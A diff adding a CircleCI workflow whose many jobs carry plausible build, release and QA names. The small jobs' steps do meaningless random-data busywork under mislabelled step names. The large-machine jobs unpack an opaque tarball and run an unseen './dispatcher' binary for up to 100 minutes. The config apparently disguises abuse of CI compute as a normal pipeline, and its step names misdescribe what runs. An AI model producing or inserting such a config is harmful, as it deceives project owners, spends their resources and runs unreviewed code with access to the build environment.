+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/big_job_output.log || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  blue_edge-v8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Trim trailing newlines
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 6656000 | base64 | head -c 200 | wc -c; true ; } > /tmp/_bld/result.out
+            echo "ready: $(sha256sum /tmp/_bld/result.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - result.out
+  edge-v8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/result.out || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  cleanup_fire-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Fold data streams
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 26179); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/_bld/main_phase_output_v4.out
+            echo "ready: $(sha256sum /tmp/_bld/main_phase_output_v4.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - main_phase_output_v4.out
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/main_phase_output_v4.out || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+  rerun_defualt-13:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Walk directory tree
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 333016 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/_bld/stash.dat
+            echo "ready: $(sha256sum /tmp/_bld/stash.dat | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stash.dat
+  defualt-13:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Verify handoff
+          command: |
+            md5sum /tmp/_bld/stash.dat || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xz -dc bundle-v2.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: env ./dispatcher
+
+  cleanup_sanity_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Expand parameter grid
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 18M /dev/urandom | base64 | wc -c; true ; } > /tmp/_bld/DONE
+            echo "ready: $(sha256sum /tmp/_bld/DONE | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - DONE
+  verify_feat-2426_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pack vendor fragments
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 88550 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/_bld/step-8.log
+            echo "ready: $(sha256sum /tmp/_bld/step-8.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-8.log
+  postbuild_november-9_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Fingerprint vendor tree
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<294572;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/_bld/phase-complete.txt
+            echo "ready: $(sha256sum /tmp/_bld/phase-complete.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - phase-complete.txt
+  redo_RUN_STG_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Mirror arena state
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 238100 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/_bld/stats.tsv
+            echo "ready: $(sha256sum /tmp/_bld/stats.tsv | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stats.tsv
+  spin_send-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Measure branch cost
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 12582912 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/_bld/step-13.out
+            echo "ready: $(sha256sum /tmp/_bld/step-13.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-13.out
+  Beta_PackageRelease_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Inflate reference set
+          command: |
+            mkdir -p /tmp/_bld
+            set +o pipefail 2>/dev/null; seq 1 1361169 | sha256sum > /tmp/_bld/handover.ok; true
+            echo "ready: $(sha256sum /tmp/_bld/handover.ok | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - handover.ok
+  g1_assemble-production-integration-tests_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Collect retire counts
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 27262976 /dev/urandom | sha256sum; true ; } > /tmp/_bld/FINAL
+            echo "ready: $(sha256sum /tmp/_bld/FINAL | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - FINAL
+  stage_defualt-13_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Format readable table
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 28311552 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/_bld/stash.dat
+            echo "ready: $(sha256sum /tmp/_bld/stash.dat | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stash.dat
+  bundle_apr14-canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Shape kernel ring
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{srand();s=0;for(i=0;i<92785;i++)s+=rand();printf "%.4f\n",s}'; true ; } > /tmp/_bld/summary.md
+            echo "ready: $(sha256sum /tmp/_bld/summary.md | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - summary.md
+  gamma_t-v2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Reconcile output files
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 59434 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/_bld/gate-ok.out
+            echo "ready: $(sha256sum /tmp/_bld/gate-ok.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - gate-ok.out
+  tap_produce-nightly-release-candidate_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Mint batch marker
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 18673 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/_bld/pt-D.pt
+            echo "ready: $(sha256sum /tmp/_bld/pt-D.pt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - pt-D.pt
+workflows:
+  build-and-test:
+    jobs:
+      - blue_edge-v8
+      - bundle_RUN_LAB
+      - edge-v8:
+          requires:
+            - blue_edge-v8
+            - bundle_RUN_LAB
+      - RUN_LAB:
+          requires:
+            - blue_edge-v8
+            - bundle_RUN_LAB
+      - pat-test:
+          requires:
+            - blue_edge-v8
+            - bundle_RUN_LAB
+      - validate-staging-test-matrix:
+          requires:
+            - blue_edge-v8
+            - bundle_RUN_LAB
+      - xray:
+          requires:
+            - blue_edge-v8
+            - bundle_RUN_LAB
+      - spin-up:
+          requires:
+            - blue_edge-v8
+            - bundle_RUN_LAB
+      - bun-build:
+          requires:
+            - blue_edge-v8
+            - bundle_RUN_LAB
+      - gamma_sanity
+      - cleanup_sanity_2:
+          requires:
+            - gamma_sanity
+      - sanity:
+          requires:
+            - cleanup_sanity_2
+      - fetcher_feat-2426:
+          requires:
+            - cleanup_sanity_2
+      - verify_feat-2426_2:
+          requires:
+            - fetcher_feat-2426
+      - feat-2426:
+          requires:
+            - verify_feat-2426_2
+      - drain_november-9:
+          requires:
+            - verify_feat-2426_2
+      - postbuild_november-9_2:
+          requires:
+            - drain_november-9
+      - november-9:
+          requires:
+            - postbuild_november-9_2
+      - Alpha_RUN_STG:
+          requires:
+            - postbuild_november-9_2
+      - redo_RUN_STG_2:
+          requires:
+            - Alpha_RUN_STG
+      - RUN_STG:
+          requires:
+            - redo_RUN_STG_2
+      - route_send-it:
+          requires:
+            - redo_RUN_STG_2
+      - spin_send-it_2:
+          requires:
+            - route_send-it
+      - send-it:
+          requires:
+            - spin_send-it_2
+      - D_PackageRelease:
+          requires:
+            - spin_send-it_2
+      - Beta_PackageRelease_2:
+          requires:
+            - D_PackageRelease
+      - PackageRelease:
+          requires:
+            - Beta_PackageRelease_2
+      - fixture_assemble-production-integration-tests:
+          requires:
+            - Beta_PackageRelease_2
+      - g1_assemble-production-integration-tests_2:
+          requires:
+            - fixture_assemble-production-integration-tests
+      - assemble-production-integration-tests:
+          requires:
+            - g1_assemble-production-integration-tests_2
+      - rerun_defualt-13:
+          requires:
+            - g1_assemble-production-integration-tests_2
+      - stage_defualt-13_2:
+          requires:
+            - rerun_defualt-13
+      - defualt-13:
+          requires:
+            - stage_defualt-13_2
+      - Alpha_apr14-canary:
+          requires:
+            - stage_defualt-13_2
+      - bundle_apr14-canary_2:
+          requires:
+            - Alpha_apr14-canary
+      - apr14-canary:
+          requires:
+            - bundle_apr14-canary_2
+      - runner_t-v2:
+          requires:
+            - bundle_apr14-canary_2
+      - gamma_t-v2_2:
+          requires:
+            - runner_t-v2
+      - t-v2:
+          requires:
+            - gamma_t-v2_2
+      - verify_produce-nightly-release-candidate:
+          requires:
+            - gamma_t-v2_2
+      - tap_produce-nightly-release-candidate_2:
+          requires:
+            - verify_produce-nightly-release-candidate
+      - produce-nightly-release-candidate:
+          requires:
+            - tap_produce-nightly-release-candidate_2
+      - Alpha_BUILD_QA
+      - BUILD_QA:
+          requires:
+            - Alpha_BUILD_QA
+      - validate_rip-it:
+          requires:
+            - Alpha_BUILD_QA
+      - rip-it:
+          requires:
+            - validate_rip-it
+      - auditor_build-quick-docker-image:
+          requires:
+            - validate_rip-it
+      - build-quick-docker-image:
+          requires:
+            - auditor_build-quick-docker-image
+      - ensure_validate-nightly-test-matrix:
+          requires:
+            - auditor_build-quick-docker-image
+      - validate-nightly-test-matrix:
+          requires:
+            - ensure_validate-nightly-test-matrix
+      - deps_rigel-ng:
+          requires:
+            - ensure_validate-nightly-test-matrix
+      - rigel-ng:
+          requires:
+            - deps_rigel-ng
+      - prefetch_realease:
+          requires:
+            - deps_rigel-ng
+      - realease:
+          requires:
+            - prefetch_realease
+      - generate_bun-fmt:
+          requires:
+            - prefetch_realease
+      - bun-fmt:
+          requires:
+            - generate_bun-fmt
+      - linter_node18-ship:
+          requires:
+            - generate_bun-fmt
+      - node18-ship:
+          requires:
+            - linter_node18-ship
+      - alpha_go-live:
+          requires:
+            - linter_node18-ship
+      - go-live:
+          requires:
+            - alpha_go-live
+      - wire_publish:
+          requires:
+            - alpha_go-live
+      - publish:
+          requires:
+            - wire_publish
+      - B_HOOK_DEV:
+          requires:
+            - wire_publish
+      - HOOK_DEV:
+          requires:
+            - B_HOOK_DEV
+      - cleanup_fire-up:
+          requires:
+            - B_HOOK_DEV
+      - fire-up:
+          requires:
+            - cleanup_fire-up
